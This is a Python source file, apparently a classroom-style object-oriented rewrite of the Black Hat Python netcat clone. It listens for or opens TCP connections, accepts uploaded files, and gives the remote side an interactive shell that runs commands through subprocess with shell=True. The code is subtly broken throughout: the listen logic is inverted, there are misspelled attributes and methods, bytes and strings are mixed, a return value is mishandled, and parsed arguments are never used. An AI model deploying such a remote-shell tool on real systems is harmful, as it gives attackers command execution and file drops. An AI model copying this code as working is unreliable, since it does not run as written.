# Tester BHP Tool to POO with Python
import sys
import socket
import threading
import subprocess
import argparse
import logging


class PyCat:

    def __init__(self):
        self.listen = False
        self.command = False
        self.upload = False
        self.execute = ""
        self.targer = ""
        self.upload_destination = str()
        self.port = 0

        # Configuracao de logger
        self.logger = logging.getLogger(__name__)
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelame)s - %(message)s')
        file_handler = logging.FileHandler('pycat.log')
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)

    def run(self):
        if not self.listen:
            self.server_loop()
        else:
            self.client_sender()

    def client_sender(self):
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        try:
            with client_socket:
                client_socket.connect((self.targer, self.port))

            if len(self.upload_destination):
                file_buffer = ""

                while True:
                    data = client_socket.recv(1024)
                    if not data:
                        break
                    else:
                        file_buffer += data
                    with open(self.upload_destination, "wb") as filerr:
                        filerr.write(file_buffer.encode())
            if len(self.execute):
                output = self.run_command(self.execute)
                client_socket.send(output.decode())

            if self.command:
                while True:
                    client_socket.send("<NC:#>".encode())
                    cmd_buffer = ""

                    while '\n' not in cmd_buffer:
                        cmd_buffer += client_socket.recv(1024).decode()
                        response = self.run_command(cmd_buffer)
                        client_socket.send(response.encode())
        except Exception as err:
            print("Error # %s" % type(err))
            client_socket.close()

    def server_loop(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if not self.targer:
            targer = socket.gethostbyname('localhost')
        else:
            try:
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind((self.targer, self.port))
                server.listen(5)
                print(f"[*] - Listening on {self.targer}:{self.port}")

                while True:
                    client_socket, addr = server.accept()
                    self.logger.debug(f"[*] - Accepted connection from {addr[0]}:{int(addr[1])}")
                    client_thread = threading.Thread(target=self.client_handler, args=(client_socket,))
                    client_thread.start()
                    client_thread.join()

            except Exception as err:
                self.logger.error("Error <#:> {}".format(err))
                server.close()

    def client_handler(self, client_socket):

        if len(self.upload_destination):
            file_buffer = ""

            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                else:
                    file_buffer += data

                try:
                    with open(self.upload_destination, "wb") as filerr:
                        filerr.write(file_buffer)
                        client_socket.send('File sucefully create [*]')
                except:
                    client_socket.send("File failed to upload [!!]")

        if len(self.execute):
            output = self.run_command(self.execute)
            client_socket.send(output.encode())

        if self.command:
            while True:
                client_socket.send("<NC:#> ".encode())
                cmd_buffer = ""
                while '\n' not in cmd_buffer:
                    cmd_buffer += client_socket.recv(1024).decode()
                response = self.run_command(cmd_buffer)
                client_socket.send(response.decote())

    def run_command(self, command):
        command = command.rstrip()
        try:
            output = subprocess.check_call(command,
                                           stderr=subprocess.STDOUT,
                                           shell=True)
        except:
            output = "Failed to execute command.\r\n"
        return output.decode()


def arg_parser():
    parser = argparse.ArgumentParser(description='NetCat with Python')
    parser.add_argument('-l', dest='listen', action='store_true', help='TODO: ')
    parser.add_argument('-e', dest='execute', metavar='FILE', help='TODO: ')
    parser.add_argument('-c', dest='command', action='store_true', help='TODO: ')
    parser.add_argument('-u', dest='upload', metavar='DESTINATION', help='TODO: ')
    parser.add_argument('-t', dest='targer', metavar='HOST', help="TODO: ")
    parser.add_argument('-p', dest='port', metavar='PORT', help='TODO: ')
    args = parser.parse_args()
    return args


if __name__ == '__main__':
    pycat = PyCat()
    args = arg_parser()

    pycat._targer = args.targer
    pycat._port = int(args.port)
    pycat._upload_destination = args.upload
    pycat._command = args.command
    pycat._execute = args.execute
    pycat._listen = args.listen
    pycat.run()